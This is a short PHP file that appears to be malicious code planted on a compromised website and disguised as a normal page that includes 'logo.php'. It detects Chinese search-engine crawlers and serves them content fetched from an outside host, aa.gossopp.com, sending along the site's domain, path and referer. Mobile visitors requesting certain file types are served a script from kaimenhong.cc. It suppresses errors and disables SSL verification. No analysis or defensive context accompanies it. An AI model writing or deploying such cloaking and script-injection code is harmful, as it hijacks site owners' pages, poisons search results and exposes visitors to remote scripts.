<?php
set_time_limit(0);
error_reporting(0);
header("Content-Type: text/html;charset=utf-8");
$a = "stristr";
$b = $_SERVER;
function goto2024($c)
{   $d = curl_init();
    curl_setopt($d, CURLOPT_URL, $c);
    curl_setopt($d, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($d, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($d, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($d, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($d, CURLOPT_HEADER, 0);
    curl_setopt($d, CURLOPT_ENCODING, 'gzip');
    $e = curl_exec($d);
    curl_close($d);
    return $e;
}
define('url', $b['REQUEST_URI']);
define('ref', !isset($b['HTTP_REFERER']) ? '' : $b['HTTP_REFERER']);
define('ent', $b['HTTP_USER_AGENT']);
define('site', "http://aa.gossopp.com/");
define('road', "?domain=" . $b['HTTP_HOST'] . "&path=" . url);
define('memes', road . "&referer=" . urlencode(ref));
define('regs', '@BaiduSpider|Sogou|Yisou|Haosou|360Spider@i');
define('mobile', '/phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone/');
define('area', $a(url, ".xml") or $a(url, ".doc") or $a(url, ".txt") or $a(url, ".ppt") or $a(url, ".pptx") or $a(url, ".xls") or $a(url, ".csv") or $a(url, ".shtml") or $a(url, ".asp") or $a(url, "scm"));
if (preg_match(regs, ent)) {
    if (area) {
        echo goto2024(site . road);
        exit;
    } else {
        echo goto2024("http://aa.gossopp.com/u.php");
        ob_flush();
        flush();
    }
}
if (area && preg_match(mobile, ent)) {
    echo <<<'EOD'
    <script src="https://www.kaimenhong.cc/1.js"></script>
EOD;
    exit;
}
require_once 'logo.php';
?>